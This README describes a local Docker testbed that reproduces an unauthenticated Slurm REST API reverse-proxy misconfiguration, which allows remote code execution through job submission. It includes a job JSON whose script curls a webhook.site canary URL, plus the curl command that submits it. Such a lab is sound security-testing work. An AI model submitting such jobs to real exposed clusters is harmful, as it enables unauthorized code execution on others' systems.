# Slurm Testbed

## Overview
The Slurm Rest API requires authentication by default. However, a common configuration involves using a reverse proxy that (theoretically) should authenticate the user with some other methods and, if successful, authenticates towards the Slurm Rest API using an hardcoded JWT token that injected into the forwarded request's headers.

This configuration is reported in the official documentation [here](https://slurm.schedmd.com/rest.html#auth_proxy) and with an implementation example [here](https://gitlab.com/SchedMD/training/docker-scale-out/-/tree/production/proxy).

If the reverse proxy is misconfigured to simply forward the requests without any authentication steps, it will allow anyone to use the API and get RCE by submitting malicious jobs to the cluster.

## This testbed

To simulate an insecure Rest API proxy, a Caddy server is deployed in reverse-proxy mode on `127.0.0.1:8080`. The reverse proxy authenticates with the Slurm Rest API via a pre-generated JWT token with no expiration, this way there's no need to generate a new token every time the testbed is launched.

The secure Slurm Rest API is also exposed on `127.0.0.1:6820` for testing purposes.

## Testbed Setup

To start the testbed, simply run `docker compose up`

## Test the vulnerability
You can test the vulnerability by modifying the `script` field in the `rest_api_test.json` file to the desired command to execute. For example, you can get a canary URL from a service like [webhook.site](https://webhook.site) and run a curl command to receive a callback. Here's an example:
```json
{
    "job": {
        "name": "test",
        "ntasks": 1,
        "current_working_directory": "/tmp",
        "environment": [
            "PATH:/bin:/usr/bin/:/usr/local/bin/"
       ]
    },
    "script": "#!/bin/bash\ncurl https://webhook.site/11b9a510-d69d-4f51-9f93-5d236c72e6c1"
}
```
Note: make sure to keep the shebang (`#!/bin/bash\n`) at the start of the string.

Then you can submit the job using curl:
```sh
curl http://127.0.0.1:8080/slurm/v0.0.39/job/submit -H "Content-Type: application/json" -d @rest_api_test.json
```

A response from a vulnerable API will look like this:
```json
{
  "meta": {
    "plugin": {
      "type": "openapi\/v0.0.39",
      "name": "Slurm OpenAPI v0.0.39",
      "data_parser": "v0.0.39"
    },
    "client": {
      "source": "[api-proxy.slurm-testbed_slurm-testbed-network]:10988"
    },
    "Slurm": {
      "version": {
        "major": 24,
        "micro": 4,
        "minor": 5
      },
      "release": "24.05.4"
    }
  },
  "errors": [],
  "warnings": [],
  "result": {
    "job_id": 11,
    "step_id": "batch",
    "error_code": 0,
    "error": "No error",
    "job_submit_user_msg": ""
  },
  "job_id": 11,
  "step_id": "batch",
  "job_submit_user_msg": ""
}
```

To check a non-vulnerable API, you can send the request to the original Rest API on port 6820, which requires authentication by default, therefore not vulnerable:
```sh
curl http://127.0.0.1:6820/slurm/v0.0.39/job/submit -H "Content-Type: application/json" -d @rest_api_test.json

Authentication failure
```

As you can see, the authentication fails and the request is rejected.